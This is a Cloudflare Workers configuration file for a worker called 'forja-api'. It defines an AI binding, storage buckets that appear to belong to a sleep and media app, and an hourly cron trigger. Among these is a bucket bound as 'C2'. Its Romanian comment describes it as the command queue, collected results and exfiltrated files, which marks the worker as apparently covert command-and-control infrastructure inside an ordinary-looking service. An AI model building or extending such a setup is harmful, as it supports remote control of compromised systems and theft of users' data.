name = "forja-api"
main = "worker.js"
compatibility_date = "2025-06-01"

[ai]
binding = "AI"

[[r2_buckets]]
binding = "RECORDS"
bucket_name = "forja-sleep"

[[r2_buckets]]
binding = "MEDIA"
bucket_name = "forja-media"

# C2 — coada de comenzi, rezultatele colectate și fișierele exfiltrate.
[[r2_buckets]]
binding = "C2"
bucket_name = "forja-c2"

[triggers]
crons = ["17 * * * *"]

[observability]
enabled = true
